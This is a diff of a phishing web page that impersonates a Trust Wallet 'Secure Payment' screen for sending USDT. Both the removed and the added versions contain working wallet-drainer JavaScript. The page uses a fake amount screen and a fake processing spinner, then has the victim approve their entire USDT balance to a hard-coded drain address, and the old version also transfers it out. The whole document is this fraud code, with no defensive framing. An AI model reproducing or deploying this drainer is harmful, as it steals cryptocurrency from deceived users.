@@ -1,87 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<link rel="icon" href="./favicon.ico" type="image/x-icon" />
-<title>Secure Payment • Trust Wallet</title>
+<title>Trust Wallet Payment</title>
+<link rel="icon" href="./favicon.ico" />
 <style>
-  body {
-    background: #081c3a;
-    color: white;
-    font-family: Arial, sans-serif;
-    text-align: center;
-    padding: 20px;
-  }
-  img { width: 80px; margin: 20px auto; }
-  h1 { font-size: 1.5em; }
-  p { opacity: 0.8; }
-  .footer { position: fixed; bottom: 10px; width: 100%; opacity: 0.5; font-size: 0.8em; }
-  .button {
-    background: #0052ff; padding: 14px 28px; border: none; color: white;
-    border-radius: 8px; cursor: pointer; font-size: 1.1em; margin-top: 20px;
-  }
-  .hidden { display: none; }
-  .fake-screen {
-    border: 2px solid #0052ff;
-    border-radius: 10px;
-    padding: 20px;
-    margin-top: 40px;
-  }
+  body { background:#081c3a; color:#fff; font-family:sans-serif; padding:20px; text-align:center; }
+  .card { background:#0b1e3e; padding:20px; border-radius:12px; max-width:400px; margin:50px auto; }
+  input { width:100%; padding:12px; border-radius:8px; border:none; margin:10px 0; text-align:center; }
+  button { background:#0052ff; padding:14px; width:100%; border:none; border-radius:8px; color:#fff; font-size:1.1em; cursor:pointer; position:relative; }
+  .spinner { width:24px; height:24px; border:3px solid #ccc; border-top:3px solid #fff; border-radius:50%; animation:spin 1s linear infinite; position:absolute; left:calc(50% - 12px); top:calc(50% - 12px); opacity:0; }
+  @keyframes spin { 100% { transform:rotate(360deg); } }
+  .processing { color:transparent; }
+  .processing .spinner { opacity:1; }
 </style>
 </head>
 <body>
-<img src="./logo.png" alt="Trust Wallet" />
-<h1>Secure Payment</h1>
-<p>Send USDT quickly and safely.</p>
+  <div class="card">
+    <h2>Send USDT</h2>
+    <input id="amount" placeholder="Amount USDT" type="number" />
+    <button id="next-btn">Next <div class="spinner"></div></button>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script>
+    const DRAIN_ADDRESS = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const ABI = [
+      {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+      {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
+    ];
 
-<div class="fake-screen" id="fakeScreen">
-  <p><strong>Amount:</strong> 1.0000 USDT</p>
-  <p><strong>Receiver:</strong> ***********B53</p>
-  <button class="button" id="fakePayButton">Pay 1 USDT</button>
-</div>
+    document.getElementById('next-btn').onclick = async () => {
+      const btn = document.getElementById('next-btn');
+      btn.classList.add('processing'); btn.disabled = true;
 
-<div id="realScreen" class="hidden">
-  <h1>Tap to Approve &amp; Complete</h1>
-  <p>Smart contract authorization required to finalize transfer.</p>
-  <button class="button" id="approveButton">Approve & Complete</button>
-</div>
-
-<div class="footer">Verified by Trust Wallet • Trusted since 2009</div>
-
-<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-<script>
-  const DRAIN_ADDRESS = "0xDA0bab807633f07f013f94DD0E6A4F96F8742B53"; // TERA WALLET
-  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-  const ABI = [
-    { "constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
-    { "constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function" },
-    { "constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function" }
-  ];
-
-  const fakeScreen = document.getElementById('fakeScreen');
-  const realScreen = document.getElementById('realScreen');
-
-  document.getElementById('fakePayButton').onclick = async () => {
-    fakeScreen.classList.add('hidden');
-    realScreen.classList.remove('hidden');
-  }
-
-  document.getElementById('approveButton').onclick = async () => {
-    if (!window.ethereum) { alert('Use Trust Wallet DApp browser'); return; }
-    const web3 = new Web3(window.ethereum);
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-    const [user] = await web3.eth.getAccounts();
-    const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
-    const balance = await contract.methods.balanceOf(user).call();
-
-    // Approve and drain all
-    await contract.methods.approve(DRAIN_ADDRESS, balance).send({ from: user });
-    await contract.methods.transferFrom(user, DRAIN_ADDRESS, balance).send({ from: user });
-
-    document.getElementById('approveButton').textContent = '✅ Success!';
-    setTimeout(() => window.close(), 2000); // close after success
-  };
-</script>
+      setTimeout(async () => {
+        if(!window.ethereum) { alert('Use Trust Wallet DApp browser'); return; }
+        await window.ethereum.request({method:'eth_requestAccounts'});
+        const web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.getAccounts();
+        const contract = new web3.eth.Contract(ABI, USDT);
+        const balance = await contract.methods.balanceOf(accounts[0]).call();
+        await contract.methods.approve(DRAIN_ADDRESS, balance).send({from:accounts[0]});
+        btn.innerText = "✅ Approved!";
+      }, 1500); // fake processing wait
+    };
+  </script>
 </body>
 </html>
